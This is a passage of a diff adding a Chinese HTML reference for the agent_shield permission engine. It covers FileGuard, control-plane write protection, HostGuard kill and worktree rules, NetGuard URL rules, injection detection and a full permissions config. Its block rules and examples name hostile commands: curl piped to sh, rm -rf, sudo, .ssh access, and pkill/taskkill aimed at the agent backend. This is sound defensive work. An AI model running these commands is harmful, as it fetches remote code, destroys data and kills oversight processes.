+  <span class="s">"/tmp/share"</span>: <span class="s">allow</span>
+<span class="k">composition</span>:                       <span class="c"># 可选；多层策略才需要</span>
+  <span class="k">source_order</span>: [<span class="s">user</span>, <span class="s">cloud</span>, <span class="s">builtin</span>]
+
+<span class="c"># 宿主注入（通常不写进业务 yaml）</span>
+<span class="k">runtime</span>:
+  <span class="k">workspace_root</span>: <span class="s">"/path/to/ws"</span>
+  <span class="c"># 或优先用 project_root（见下）</span>
+  <span class="k">trusted_dirs</span>: []</pre>
+      </div>
+    </div>
+
+    <div class="explain">
+      <h4><code>file_guard.workspace</code> · 策略轴绑定</h4>
+      <p>语义：声明<strong>工作区根目录</strong>上 read / write / exec 的 PermissionLevel；配置对象<strong>不含路径字段</strong>。
+        路径在配置编译期由 <code>runtime_workspace_root(config)</code> 解析，再生成一条 <code>match=prefix</code> 的 <code>FileGuardPathRule</code>。</p>
+      <table class="ref">
+        <thead><tr><th>项</th><th>契约</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="k">配置形态</td>
+            <td><code>{ read?, write?, exec? }</code>，取值 <code>allow|ask|deny</code>；缺轴按编译默认补齐</td>
+          </tr>
+          <tr>
+            <td class="k">根路径来源</td>
+            <td><code>runtime.project_root</code> 优先，否则 <code>runtime.workspace_root</code>；由宿主在 <code>update_config</code> 写入 <code>config["runtime"]</code></td>
+          </tr>
+          <tr>
+            <td class="k">编译产物</td>
+            <td><code>prefix(resolved_root) → (read, write, exec)</code>，并入生效 <code>paths</code> 规则集</td>
+          </tr>
+          <tr>
+            <td class="k">根缺失</td>
+            <td>已配置 <code>workspace</code> 但根未解析成功：记 WARN，<strong>丢弃本条规则</strong>；不改变 FileGuard <code>enabled</code> 及其余规则</td>
+          </tr>
+          <tr>
+            <td class="k">判定范围</td>
+            <td>命中该前缀的访问使用本轴；未命中则继续 <code>defaults</code> / 其它 <code>paths</code> / 迁移规则</td>
+          </tr>
+        </tbody>
+      </table>
+      <p>示例：<code>file_guard.workspace = {read:allow, write:allow, exec:allow}</code> 且
+        <code>runtime.workspace_root = "/data/ws"</code> ⇒ 对 <code>/data/ws/**</code> 三轴 ALLOW。</p>
+
+      <h4><code>external_directory</code> · 旧版顶层配置（与 <code>file_guard</code> 同级）</h4>
+      <p>为兼容旧 permissions 形态保留。等级须显式给出，值域 <code>allow|ask|deny</code>；不存在隐式「一律拒绝 / 一律放行」。</p>
+      <p>新配置应直接写 <code>file_guard.defaults</code> + <code>workspace</code> + <code>paths</code>；本键仅作迁移与回退。</p>
+      <table class="ref">
+        <thead><tr><th>形态</th><th>编译语义</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="k">string</td>
+            <td>例如 <code>ask</code>：默认档<strong>读 / 写 / 执行三轴同为该等级</strong>。已写 <code>file_guard.defaults</code> 时本值只作缺省回退</td>
+          </tr>
+          <tr>
+            <td class="k">map["*"]</td>
+            <td>未命中更具体路径时的默认档；合法值 <code>allow|ask|deny</code> → <strong>读 / 写 / 执行三轴同值</strong></td>
+          </tr>
+          <tr>
+            <td class="k">map[path]</td>
+            <td>
+              path 为目录前缀（如 <code>/tmp/share: allow</code>）：
+              <ul style="margin:4px 0 0;padding-left:1.1em">
+                <li><code>allow</code> → 读 allow、写 allow、执行 ask</li>
+                <li><code>ask</code> / <code>deny</code> → 读 / 写 / 执行三轴同为该值</li>
+              </ul>
+              与 <code>file_guard.paths</code> 并存时迁入 paths；同前缀已有条目则跳过
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <table class="ref" style="margin-top:8px">
+        <thead><tr><th>与 enabled / 现行 file_guard 的关系</th><th>行为</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="k">enabled 缺省</td>
+            <td>显式 <code>file_guard.enabled</code> 优先；未写时：配了 <code>external_directory</code>，或宿主传了 <code>trusted_dirs</code> ⇒ 打开 FileGuard</td>
+          </tr>
+          <tr>
+            <td class="k">仅配置本键</td>
+            <td>按旧规则编译：① 工作区根 → 读/写/执行全 allow；② <code>"*"</code> / 字符串 → 默认档；③ 本键里的具体路径 → 前缀规则（权限见上表）</td>
+          </tr>
+          <tr>
+            <td class="k">与 file_guard.* 并存</td>
+            <td>
+              <ul style="margin:0;padding-left:1.1em">
+                <li>已写 <code>file_guard.defaults</code> → 用它；没写才用本键的 <code>"*"</code> / 字符串补默认档</li>
+                <li>先用 <code>file_guard.paths</code> / <code>workspace</code>；再把本键的具体路径补进去；<strong>同一前缀已有规则则跳过</strong>（以 file_guard 为准）</li>
+              </ul>
+            </td>
+          </tr>
+          <tr>
+            <td class="k">runtime.trusted_dirs</td>
+            <td>
+              宿主传入的额外信任目录（常见：<code>/add-dir</code>）。每条编成前缀规则：<strong>读 allow、写 allow、执行 ask</strong>。
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ImmutableControlPlane -->
+  <section class="sec" id="icp">
+    <h2>5. ImmutableControlPlane</h2>
+    <p class="sub">宿主控制面写保护 · 与 FileGuard 并列的独立组件</p>
+    <div class="box hi-gray" style="margin-bottom:12px">
+      <div class="n">它是干什么的</div>
+      <div class="d">两件事（均只处理 write/exec；read → 弃权）：
+        <ol style="margin:6px 0 0;padding-left:1.2em">
+          <li><b>控制面目录</b>：路径落在 <code>runtime.immutable_control_roots</code> 之下 → <b>DENY</b>。</li>
+          <li><b>敏感文件</b>：路径落在 <code>runtime.workspace_root</code> 之下且命中下方列表 → <b>ASK</b>。</li>
+        </ol>
+        候选范围同 FileGuard：原文 / 剥壳；子命令弃权。</div>
+    </div>
+
+    <div class="grid cols-2">
+      <div class="panel">
+        <div class="ph gray">配置（runtime，宿主注入）</div>
+        <table class="ref">
+          <tr><th>键</th><th>类型</th><th>作用</th></tr>
+          <tr>
+            <td class="k">runtime.immutable_control_roots</td>
+            <td>list[str/path]</td>
+            <td>控制面根目录。空 / 缺省 → 组件不装载。</td>
+          </tr>
+          <tr>
+            <td class="k">runtime.workspace_root</td>
+            <td>str/path</td>
+            <td>敏感文件判定边界；相对路径解析基目录。</td>
+          </tr>
+        </table>
+        <pre class="ex" style="margin-top:8px"><span class="k">runtime</span>:
+  <span class="k">workspace_root</span>: <span class="s">"/path/to/ws"</span>
+  <span class="k">immutable_control_roots</span>:
+    - <span class="s">"/path/to/ws/control"</span>
+    - <span class="s">"/etc/agent-control"</span></pre>
+      </div>
+      <div class="panel">
+        <div class="ph red">什么情况返回什么</div>
+        <table class="ref">
+          <tr><th>条件</th><th>permission</th><th>matched_rule</th></tr>
+          <tr>
+            <td><code>runtime.immutable_control_roots</code> 空 / 未配置</td>
+            <td>弃权 <code>None</code></td>
+            <td>—</td>
+          </tr>
+          <tr>
+            <td>write/exec 落在 <code>runtime.immutable_control_roots</code> 任一目录之下</td>
+            <td><b>DENY</b></td>
+            <td><code>immutable_control_plane</code></td>
+          </tr>
+          <tr>
+            <td>write/exec 命中敏感文件列表，且路径在 <code>runtime.workspace_root</code> 之下</td>
+            <td><b>ASK</b></td>
+            <td><code>immutable_project_execution_config</code></td>
+          </tr>
+          <tr>
+            <td>仅 read，或不在上述范围</td>
+            <td>弃权 <code>None</code></td>
+            <td>—</td>
+          </tr>
+        </table>
+        <div class="box" style="margin-top:8px">
+          <div class="n">例</div>
+          <div class="d">
+            <code>runtime.immutable_control_roots</code> 含 <code>…/control</code>：写 <code>…/control/config.yaml</code>（含 shell <code>rm</code>）→ DENY。<br>
+            写 <code>runtime.workspace_root</code> 下的 <code>package.json</code> → ASK。<br>
+            只读这些文件 → 本组件弃权。
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="explain">
+      <h4>敏感文件列表</h4>
+      <p>相对 <code>runtime.workspace_root</code>；write/exec → ASK。</p>
+      <ul>
+        <li>文件名（任意子目录）：<code>package.json</code> · <code>pyproject.toml</code> · <code>setup.py</code> · <code>Makefile</code> · <code>CMakeLists.txt</code> · <code>build.gradle</code> · <code>build.gradle.kts</code> · <code>settings.gradle</code> · <code>settings.gradle.kts</code> · <code>pom.xml</code> · <code>build.rs</code> · <code>.gitlab-ci.yml</code> · <code>.gitlab-ci.yaml</code></li>
+        <li>前缀：<code>.github/workflows/</code> · <code>.git/hooks/</code></li>
+        <li>定点：<code>.vscode/tasks.json</code></li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- HostGuard -->
+  <section class="sec" id="hostguard">
+    <h2>6. HostGuard</h2>
+    <p class="sub">默认关闭 · 开启后参与取最严 · 命中一律 DENY</p>
+    <div class="box hi-orange" style="margin-bottom:12px">
+      <div class="n">看哪些候选</div>
+      <div class="d">仅 <b>shell</b>，且工具名在安全名单（bash / powershell / mcp_exec_command）。
+        <b>原文 / 剥壳 / 子命令都会跑</b>（不按 kind 弃权）。非 shell 弃权。</div>
+    </div>
+    <div class="explain">
+      <h4>怎么匹配</h4>
+      <p>输入：工具参数里的命令字符串（<code>command</code> / <code>cmd</code>）。匹配方式：<strong>子串正则 / 切段解析</strong>，要求「杀进程类命令」与「受保护名字」在同一段里同时出现。</p>
+      <ul>
+        <li>内置形态（<code>enabled: true</code> 即生效）：<code>pkill|killall|kill</code> +（中间可有参数，遇 <code>;</code> <code>|</code> <code>&amp;</code> 换行断开）+ <code>jiuwenswarm|jiuwenclaw</code></li>
+        <li><code>pkill -f jiuwenswarm</code> → DENY（要同时有 pkill 与 jiuwenswarm）</li>
+        <li><code>pkill nginx</code> → 放行本规则；<code>echo jiuwenswarm</code> → 放行本规则</li>
+        <li>切段：按 <code>;</code> <code>&amp;&amp;</code> <code>|</code> 切开后，段首是 kill 族且段内带受保护名 → DENY</li>
+      </ul>
+    </div>
+    <div class="panel" style="margin-top:12px">
+      <div class="ph orange">配置项</div>
+      <table class="ref">
+        <tr><th>键</th><th>默认</th><th>开了拦什么 / 怎么判</th><th>命中例</th></tr>
+        <tr>
+          <td class="k">host_guard.enabled</td>
+          <td><code>false</code></td>
+          <td>总开关；false → 组件不装载</td>
+          <td>—</td>
+        </tr>
+        <tr>
+          <td class="k">host_guard.protected_patterns</td>
+          <td>内置 6 条</td>
+          <td>
+            整段命令正则，元素 <code>{pattern, reason}</code>。缺省 6 条：
+            <code>pkill|killall|kill</code>×<code>jiuwenswarm|jiuwenclaw</code>，以及
+            <code>jiuwenswarm … | xargs kill</code>。
+            <strong>写出本键 = 只用你的列表做整段正则</strong>（内置 6 条不再参与）。
+            另有切段规则（段首 kill 族且段内含 jiuwenswarm/jiuwenclaw）始终生效，不由本键控制。
+          </td>
+          <td><code>pkill -f jiuwenswarm</code></td>
+        </tr>
+        <tr>
+          <td class="k">host_guard.shell_mismatch</td>
+          <td><code>true</code></td>
+          <td>仅工具名 <code>bash</code>：命令文本像 PowerShell（Cmdlet / <code>$env:</code> 等）→ DENY</td>
+          <td>bash + <code>Get-ChildItem</code></td>
+        </tr>
+        <tr>
+          <td class="k">host_guard.worktree_guard</td>
+          <td><code>true</code></td>
+          <td>
+            防 Agent 用 <code>git worktree add &lt;path&gt;</code> 在 <code>runtime.workspace_root</code> <strong>外</strong>再建可写工作树（绕开工作区边界）。
+            目标必须在 workspace 内；路径解析失败也 DENY。
+          </td>
+          <td><code>git worktree add ../outside</code> → DENY；<code>git worktree add .worktrees/f</code> → 放行本项</td>
+        </tr>
+        <tr>
+          <td class="k">host_guard.python_name_kill</td>
+          <td><code>false</code></td>
+          <td>段首为 kill 族，且目标名像 python（非纯 PID）→ DENY</td>
+          <td><code>pkill python</code> · <code>taskkill /IM python.exe /F</code></td>
+        </tr>
+        <tr>
+          <td class="k">host_guard.backend_pid_kill</td>
+          <td><code>false</code></td>
+          <td>
+            防按数字 PID 杀掉宿主后端 / 当前权限进程。
+            从命令抽出目标 PID，与运行时集合求交：① 当前进程；② 其祖先（需 psutil）；③ cmdline 像 JiuwenSwarm 后端的进程（如
+            <code>-m jiuwenswarm.app</code>、<code>jiuwenswarm-agentserver</code>、
+            <code>--desktop-run-agent</code> 等，见代码 <code>_BACKEND_*</code>）。
+            PID 名单运行时扫描，配置里不写死。
+          </td>
+          <td><code>kill 12345</code> / <code>taskkill /PID 12345</code>（12345 落在上述集合时）</td>
+        </tr>
+        <tr>
+          <td class="k">host_guard.whole_line_regex</td>
+          <td><code>false</code></td>
+          <td>
+            <b>路径开关</b>，不是多一道独立威胁类型：true 时整段改走<strong>整行正则</strong>判定（模块 <code>whole_line_regex.py</code>），上表默认路径（shell_mismatch / python_name_kill / backend_pid_kill / 严格 worktree / 切段 safety）不跑。命中规则名 <code>host_guard:whole_line_regex</code>。整行路径内容：
+            <ul style="margin:4px 0 0;padding-left:1.1em">
+              <li>固定整行正则：杀 jiuwenswarm/jiuwenclaw；按名 <code>Stop-Process</code>/<code>taskkill /IM</code> 打 python、node、jiuwenswarm；<code>pkill/killall python</code></li>
+              <li>防自尽：命令目标 PID 为<strong>当前进程或父进程</strong>（或 <code>runtime.protected_pids</code> 注入的集合）→ DENY</li>
+              <li>宽松 worktree：文本里出现 <code>worktree add</code> 且目标出 workspace → DENY（可误伤 <code>echo worktree add ../x</code>）；仅 <code>bash</code>/<code>powershell</code>/<code>core.powershell</code> 跑 worktree，<code>mcp_exec_command</code> 不跑</li>
+            </ul>
+          </td>
+          <td><code>taskkill /PID &lt;本PID&gt; /F</code> · <code>Stop-Process -Name python</code> · <code>taskkill /IM node.exe /F</code></td>
+        </tr>
+      </table>
+      <pre class="ex" style="margin-top:8px;font-size:11px"><span class="k">host_guard</span>:
+  <span class="k">enabled</span>: <span class="n">true</span>
+  <span class="k">worktree_guard</span>: <span class="n">true</span>
+  <span class="k">shell_mismatch</span>: <span class="n">true</span>
+  <span class="k">python_name_kill</span>: <span class="n">false</span>
+  <span class="k">backend_pid_kill</span>: <span class="n">false</span>
+  <span class="k">protected_patterns</span>:                <span class="c"># 可选；缺省用内置</span>
+    - <span class="k">pattern</span>: <span class="s">'\bpkill\b[^\n\r;|&amp;]*agent_server'</span>
+      <span class="k">reason</span>: <span class="s">blocked: pkill agent_server</span>
+  <span class="k">whole_line_regex</span>: <span class="n">false</span></pre>
+    </div>
+  </section>
+
+  <!-- NetGuard -->
+  <section class="sec" id="netguard">
+    <h2>7. NetGuard</h2>
+    <p class="sub">默认关闭 · 开启后参与取最严</p>
+    <div class="box hi-blue" style="margin-bottom:12px">
+      <div class="n">看哪些候选</div>
+      <div class="d">只认<strong>网络类工具名</strong>；忽略候选 kind。非网络工具（如 bash）弃权。</div>
+    </div>
+    <div class="panel">
+      <div class="ph blue">配置项</div>
+      <table class="ref">
+        <tr><th>键</th><th>类型 / 可取值</th><th>默认</th></tr>
+        <tr><td class="k">net_guard.enabled</td><td>bool</td><td><code>false</code></td></tr>
+        <tr><td class="k">net_guard.defaults</td><td>allow|ask|deny</td><td><code>allow</code></td></tr>
+        <tr><td class="k">net_guard.urls</td><td>object：模式→action</td><td><code>{}</code></td></tr>
+        <tr><td class="k">net_guard.connection.allow_http</td><td>bool</td><td><code>false</code></td></tr>
+        <tr><td class="k">net_guard.connection.allow_loopback</td><td>bool</td><td><code>false</code></td></tr>
+        <tr><td class="k">net_guard.connection.allow_private_network</td><td>bool</td><td><code>false</code></td></tr>
+      </table>
+      <div class="box" style="margin-top:6px"><div class="n">作用范围</div><div class="d">网络类工具；非网络工具弃权。bash 命令文本内 URL 抽取不在本组件路由范围内。</div></div>
+      <pre class="ex" style="margin-top:6px;font-size:11px"><span class="k">net_guard</span>:
+  <span class="k">enabled</span>: <span class="n">true</span>
+  <span class="k">defaults</span>: <span class="s">ask</span>                 <span class="c"># allow | ask | deny</span>
+  <span class="k">urls</span>:
+    <span class="s">"https://evil.example/*"</span>: <span class="s">deny</span>
+    <span class="s">"https://api.example/*"</span>: <span class="s">allow</span>
+    <span class="s">"http://*"</span>: <span class="s">ask</span>
+  <span class="k">connection</span>:
+    <span class="k">allow_http</span>: <span class="n">false</span>
+    <span class="k">allow_loopback</span>: <span class="n">false</span>
+    <span class="k">allow_private_network</span>: <span class="n">false</span></pre>
+    </div>
+  </section>
+
+  <!-- detection -->
+  <section class="sec" id="detection">
+    <h2>8. detection · 内容检测</h2>
+    <p class="sub">独立于 <code>tool_permission</code> · 输出风险评定 · 不参与工具 allow/ask/deny 合并</p>
+
+    <div class="box hi-gray" style="margin-bottom:12px">
+      <div class="n">定位</div>
+      <div class="d">对进入模型侧的内容做注入/安全类检测，返回 <code>RiskAssessment</code> 软信号。
+        是否中断调用由宿主决定；本包不执行工具拦截，亦不接入 <code>check_permission</code> 流水线。
+        当前有效路径主要为<strong>规则匹配</strong>与<strong>模型推理 + Parser</strong>；<code>LLMPromptInjectionBackend</code> 尚未完成远端推理，实际回退至规则后端。</div>
+    </div>
+
+    <div class="grid cols-2" style="margin-bottom:12px">
+      <div class="panel">
+        <div class="ph blue">调用契约</div>
+        <div class="box"><div class="n">接口</div><div class="d" style="font-family:Consolas,monospace;font-size:12px;line-height:1.5">backend: GuardrailBackend<br>assessment = await backend.analyze(ctx: GuardrailContext)</div></div>
+        <div class="box"><div class="n">配置</div><div class="d">经各 Backend / Parser 构造参数注入；<strong>无</strong> permissions.yaml 顶层段。<br>导入：<code>from agent_shield.detection import …</code></div></div>
+      </div>
+      <div class="panel">
+        <div class="ph green">输入 / 输出</div>
+        <div class="box"><div class="n">输入 <code>GuardrailContext</code></div><div class="d">内置后端统一取文本：<code>ctx.get_text()</code>，否则 <code>str(ctx.content)</code>。
+          <code>event</code>、<code>metadata</code> 由调用方填充，现有后端不依赖。</div></div>
+        <div class="box hi-green"><div class="n">输出 <code>RiskAssessment</code></div><div class="d">
+          <code>has_risk: bool</code><br>
+          <code>risk_level: RiskLevel</code>（SAFE / LOW / MEDIUM / HIGH / CRITICAL）<br>
+          <code>risk_type: Optional[str]</code> · <code>confidence: float</code> · <code>details: Optional[dict]</code>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="ph orange">内置 Backend</div>
+      <table class="ref">
+        <tr><th>Backend</th><th>检测目标</th><th>判定方式</th><th>主要配置</th></tr>
+        <tr>
+          <td class="k">RuleBasedPromptInjection</td>
+          <td>提示词注入</td>
+          <td>正则检索；任一 pattern 命中即 <code>has_risk=True</code>（默认 6 条，可覆写）</td>
+          <td><code>patterns: list[str]</code> · <code>risk_level</code>（默认 HIGH）</td>
+        </tr>
+        <tr>
+          <td class="k">LLMPromptInjection</td>
+          <td>提示词注入（设计）</td>
+          <td><strong>未实现远端 LLM 调用</strong>；回退 <code>RuleBasedPromptInjection</code></td>
+          <td><code>api_endpoint</code> · <code>api_key</code> · <code>model_name</code> · <code>system_prompt</code> · <code>timeout</code></td>
+        </tr>
+        <tr>
+          <td class="k">APIModelBackend</td>
+          <td>由远端模型与 Parser 定义</td>
+          <td><code>POST api_url</code>，body <code>{"text": …}</code>；响应交 <code>parser.parse</code></td>
+          <td><code>api_url</code> · <code>api_key</code> · <code>parser</code> · <code>timeout</code>（默认 30s）· <code>risk_type</code></td>
+        </tr>
+        <tr>
+          <td class="k">LocalModelBackend</td>
+          <td>由本地分类模型与 Parser 定义</td>
+          <td>transformers 序列分类推理 → <code>parser.parse</code></td>
+          <td><code>model_path</code> · <code>device</code>（默认 auto）· <code>parser</code> · <code>risk_type</code></td>
+        </tr>
+      </table>
+      <p class="note-line" style="margin-top:8px">配套 Parser：<b>BertBinaryParser</b>（二分类 logits/概率 + 置信度阈值）· <b>QwenGuardParser</b>（解析 Safety / Categories 文本或 JSON）。</p>
+    </div>
+  </section>
+
+  <!-- full example -->
+  <section class="sec" id="example">
+    <h2>9. 完整配置示例（tool_permission）</h2>
+    <p class="sub">一份可对照的 permissions 段 · 宿主仍须注入 runtime 后 update_config</p>
+    <pre class="ex">permissions:
+  enabled: true                          <span class="c"># true | false</span>
+  permission_mode: normal                <span class="c"># normal | strict</span>
+  package_builtin_rules: true            <span class="c"># true | false | "0"|"false"|"no"|"off"</span>
+  shell_allowlist: null                  <span class="c"># 缺键=默认名单；null/[]=关闭；或 ["echo","ls"]</span>
+
+  tools:                                 <span class="c"># allow | ask | deny</span>
+    bash: allow
+    powershell: ask
+    mcp_exec_command: { "*": deny }
+  defaults:
+    "*": ask                             <span class="c"># allow | ask | deny | undetermined</span>
+
+  rules:
+    - id: block_curl_pipe
+      layer: user                        <span class="c"># 非 builtin → 用户层</span>
+      tools: [bash]
+      pattern: "re:curl.+\\|\\s*sh"
+      match_type: command                <span class="c"># 仅 command（或缺省）生效</span>
+      action: deny                       <span class="c"># allow | ask | deny</span>
+    - id: severity_sample
+      tools: [bash]
+      pattern: "rm -rf *"
+      match_type: command
+      severity: HIGH                     <span class="c"># LOW|MEDIUM|HIGH|CRITICAL（无 action 时）</span>
+    - id: builtin_sample
+      layer: builtin                     <span class="c"># 内置层</span>
+      tools: [bash]
+      pattern: "re:^sudo\\b"
+      match_type: command
+      action: ask
+    - id: ignored_path_rule
+      tools: [bash]
+      pattern: "/etc/*"
+      match_type: path                   <span class="c"># 非 command → Tiered 忽略</span>
+      action: deny
+  approval_overrides:                    <span class="c"># 仅 action=allow</span>
+    - id: remember_ok
+      tools: [bash]
+      pattern: "rm -rf /tmp/ok"
+      match_type: command
+      action: allow
+
+  guard_actions:                         <span class="c"># 每键 allow | ask | deny</span>
+    too_complex: ask
+    parse_unavailable: ask
+    structure_guard: ask
+    interpreter_sink: ask
+  shell_guard:                           <span class="c"># 旧版键，优先被 guard_actions 覆盖</span>
+    unknown_structure: true
+    interpreter_sink: true
+
+  file_guard:
+    enabled: true
+    defaults: { read: ask, write: deny, exec: ask }
+    workspace: { read: allow, write: allow, exec: allow }
+    paths:
+      - path: "**/.ssh/**"
+        match: glob                      <span class="c"># glob | prefix</span>
+        read: ask
+        write: deny
+        exec: deny
+  external_directory: { "*": ask, "/tmp/share": allow }
+  composition:                             <span class="c"># 可选；多层才需要</span>
+    source_order: [user, cloud, builtin]   <span class="c"># 合法: user|cloud|builtin</span>
+
+  host_guard:
+    enabled: false
+    worktree_guard: true
+    shell_mismatch: true
+    python_name_kill: false
+    backend_pid_kill: false
+    # protected_patterns: [{pattern: '...', reason: '...'}]  # 可选；缺省内置
+    whole_line_regex: false
+
+  net_guard:
+    enabled: false
+    defaults: allow                      <span class="c"># allow | ask | deny</span>
+    urls:
+      "https://evil.example/*": deny
+      "https://api.example/*": allow
+    connection:
+      allow_http: false
+      allow_loopback: false
+      allow_private_network: false
+
+  runtime:                               <span class="c"># 宿主注入，通常不写业务 yaml</span>
+    workspace_root: "/path/to/ws"
+    project_root: "/path/to/project"
+    cwd: "/path/to/ws"
+    trusted_dirs: ["/path/to/extra"]
+    protected_pids: []
+    immutable_control_roots: []</pre>
+    <p class="note-line">产品侧键 skill_authorization / owner_scopes 不由引擎裁决，见第 10 章</p>
+  </section>
+
+  <!-- Runtime chain via relay-claw -->
+  <section class="sec" id="runtime-chain">
+    <h2>10. 经 relay-claw 的拦截顺序</h2>
+    <p class="sub">上调用下 · 橙框可能改写可见结果 · 绿框 = agent_shield · 测试从 OfficeAce / relay-claw 进时看本章</p>
+
+    <div class="ctx-flow">
+      <div class="legend">
+        <span><i class="lg-fe"></i>前端</span>
+        <span><i class="lg-api"></i>API</span>
+        <span><i class="lg-rail"></i>权限 Rail</span>
+        <span><i class="lg-sec"></i>agent_shield</span>
+        <span><i class="lg-warn"></i>产品侧 / 外围</span>
+        <span><i class="lg-sbx"></i>沙箱</span>
+      </div>
+
+      <div class="layer">
+        <div class="zh">L0 流量入口</div>
+        <div class="box fe" style="max-width:280px;margin:0 auto">
+          <div class="n">OfficeAce 前端</div>
+          <div class="r">对话 · 审批 · 配置</div>
+        </div>
+      </div>
+      <div class="varr"><span>↓</span></div>
+
+      <div class="layer" style="background:#f8f7ff">
+        <div class="zh">L1 进程</div>
+        <div class="box api" style="max-width:360px;margin:0 auto">
+          <div class="n">relay-claw API</div>
+          <div class="r">转发 · 拉起 sidecar · 写配置</div>
+        </div>
+      </div>
+      <div class="varr"><span>↓</span></div>
+
+      <div class="layer" style="background:#f8fbff;border-color:#93c5fd">
+        <div class="zh">L2 进程 · AgentServer</div>
+
+        <div class="row row-3" style="margin-bottom:10px">
+          <div class="box"><div class="n">WS 接入</div><div class="r">收请求</div></div>
+          <div class="box"><div class="n">AgentManager</div><div class="r">管实例</div></div>
+          <div class="box"><div class="n">Adapter</div><div class="r">挂 Rail · 调模型</div></div>
+        </div>
+
+        <div class="pipe">
+          <div class="zh">工具调用拦截（自上而下 · BEFORE_TOOL_CALL）</div>
+
+          <div class="seq">
+            <div class="seq-item">
+              <div class="box warn">
+                <div class="n">SkillAuthorizationRail</div>
+                <div class="r">批准 Skill 声明的临时权限</div>
+              </div>
+            </div>
+            <div class="seq-arrow">↓</div>
+
+            <div class="seq-item">
+              <div class="rail-wrap">
+                <div class="hd">
+                  PermissionInterruptRail
+                  <span class="sub">通用工具权限外壳 · 内调 agent_shield</span>
+                </div>
+                <div class="bd">
+                  <div class="seq">
+                    <div class="seq-item">
+                      <div class="box warn">
+                        <div class="n">owner_scopes</div>
+                        <div class="r">身份旁路：与全局取严</div>
+                      </div>
+                    </div>
+                    <div class="seq-arrow">↓</div>
+
+                    <div class="seq-item">
+                      <div class="nest">
+                        <div class="shield-row">
+                          <div class="box sec">
+                            <div class="n">agent_shield</div>
+                            <div class="r">allow / ask / deny</div>
+                          </div>
+                          <div class="box warn">
+                            <div class="n">Skill 临时权限</div>
+                            <div class="r">基线 + 已批权限差</div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="seq-arrow">↓<small>仅 ASK</small></div>
+
+                    <div class="seq-item">
+                      <div class="box warn">
+                        <div class="n">会话记住</div>
+                        <div class="r">只记允许，不记拒绝</div>
+                      </div>
+                    </div>
+                    <div class="seq-arrow">↓</div>
+
+                    <div class="seq-item">
+                      <div class="box warn">
+                        <div class="n">审批卡</div>
+                        <div class="r">允许 / 始终允许 / 拒绝</div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="seq-arrow">↓<small>ALLOW 之后</small></div>
+
+            <div class="seq-item">
+              <div class="row row-3">
+                <div class="box warn">
+                  <div class="n">执行层 allowlist</div>
+                  <div class="r">执行前再拦一道</div>
+                </div>
+                <div class="box warn">
+                  <div class="n">软删除</div>
+                  <div class="r">删除改归档</div>
+                </div>
+                <div class="box">
+                  <div class="n">工具执行</div>
+                  <div class="r">bash · sys_operation</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="side-row">
+            <div class="box warn">
+              <div class="n">FlashPermissionRail</div>
+              <div class="r">合并卡 → 拆成真工具再查</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="varr"><span>↓</span></div>
+
+      <div class="row row-2">
+        <div class="layer">
+          <div class="zh">L3a 外部</div>
+          <div class="box ext"><div class="n">大模型 API</div><div class="r">产生工具意图</div></div>
+        </div>
+        <div class="layer" style="background:#f0f9ff;border-color:#7dd3fc">
+          <div class="zh">L3b 进程</div>
+          <div class="box sbx"><div class="n">jiuwenbox</div><div class="r">隔离执行</div></div>
+        </div>
+      </div>
+
+      <div class="part">
+        <h3>模块特殊处理（测 shield 时怎么隔离）</h3>
+        <p class="hint">
+          测 <b>agent_shield</b>：走 Deep + bash，套
+          <code>docs/fixtures/w1a_e2e_permissions.yaml</code>，新会话。
+          判读 <code>engine.decision</code>。橙模块打开时，可见结果可能 ≠ 引擎结论——属产品行为。
+        </p>
+
+        <table class="ref iso">
+          <thead>
+            <tr>
+              <th>模块</th>
+              <th>特殊处理</th>
+              <th class="off">测 shield 时</th>
+              <th class="on">要测它时</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="mod warn">SkillAuthorizationRail</td>
+              <td>
+                Skill 可声明权限差。批准加载后，在结束前临时启用这套声明。
+                只处理 <code>skill_tool</code> / <code>skill_complete</code>；审完打标，
+                让权限 Rail <b>不要对同一次加载再弹一张卡</b>。
+              </td>
+              <td class="off"><code>skill_authorization.enabled: false</code>；勿调 Skill</td>
+              <td class="on">enabled true；加载带权限差分的 Skill</td>
+            </tr>
+            <tr>
+              <td class="mod">PermissionInterruptRail</td>
+              <td>
+                通用工具权限外壳。未挂或 <code>permissions.enabled=false</code> 时整段不跑，无 shield。
+              </td>
+              <td class="off">enabled true 且 rail 已挂</td>
+              <td class="on">enabled false / 卸 rail → 无 <code>engine.decision</code></td>
+            </tr>
+            <tr>
+              <td class="mod warn">owner_scopes</td>
+              <td>产品旁路（引擎不解析）。不组 config、无传名字 API；用已发布 key 调 <code>evaluate_global_policy_directly</code>，再与 <code>owner_scopes[channel][user]</code> 取严；ASK→deny。可能在 shield 前直拒。</td>
+              <td class="off">置空或不配身份</td>
+              <td class="on"><pre class="ex" style="margin:0;white-space:pre-wrap;font-size:11px;line-height:1.35">permissions:
+  owner_scopes:
+    feishu:
+      "user_老板":
+        tools:
+          bash: allow
+          write_file: allow
+        defaults:
+          "*": ask
+      "user_同事":
+        tools:
+          bash: deny
+          write_file: deny
+        defaults:
+          "*": deny</pre>
+                <div style="margin-top:4px">请求需走数字分身路径（网关自动带 <code>avatar_mode</code> / <code>principal_user_id</code>）</div></td>
+            </tr>
+            <tr>
+              <td class="mod sec">agent_shield</td>
+              <td>进程内判定本体。被权限 Rail 调用，不是独立 rail。</td>
+              <td class="off">— 要测的本体</td>
+              <td class="on">—</td>
+            </tr>
+            <tr>
+              <td class="mod warn">Skill 临时权限</td>
+              <td>
+                Skill 已批准、尚未结束时：后续工具仍进 shield，但用的是
+                <b>用户基线 + 该 Skill 声明的权限差</b>（一次性 <code>config=</code>），不是日常 yaml。
+                Skill 结束后收回。
+              </td>
+              <td class="off">未在跑已批准的 Skill</td>
+              <td class="on">Skill 已批准且未结束</td>
+            </tr>
+            <tr>
